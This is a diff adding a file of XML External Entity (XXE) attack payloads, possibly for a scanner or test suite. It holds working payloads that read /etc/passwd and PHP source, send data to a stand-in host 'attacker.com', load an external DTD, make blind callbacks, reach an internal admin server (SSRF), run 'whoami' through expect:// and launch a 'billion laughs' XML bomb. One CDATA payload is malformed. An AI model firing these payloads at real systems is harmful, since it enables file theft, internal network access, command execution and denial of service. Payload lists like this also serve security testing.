@@ -1,0 +1,51 @@
+<!-- XXE (XML External Entity) Attack Payloads -->
+
+<!-- Basic XXE -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+<!-- XXE with parameter entities -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
+<foo>test</foo>
+
+<!-- XXE data exfiltration -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/collect.php?data=file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+<!-- XXE with CDATA -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY wrapper "<!CDATA[&xxe;]]>">]>
+<foo>&wrapper;</foo>
+
+<!-- Billion laughs attack (XML bomb) -->
+<?xml version="1.0"?>
+<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">]>
+<lolz>&lol2;</lolz>
+
+<!-- XXE with external DTD -->
+<?xml version="1.0"?>
+<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
+<foo>test</foo>
+
+<!-- Blind XXE -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/callback">%xxe;]>
+<foo>test</foo>
+
+<!-- SSRF via XXE -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]>
+<foo>&xxe;</foo>
+
+<!-- XXE with PHP wrapper -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
+<foo>&xxe;</foo>
+
+<!-- XXE expect module -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]>
+<foo>&xxe;</foo>
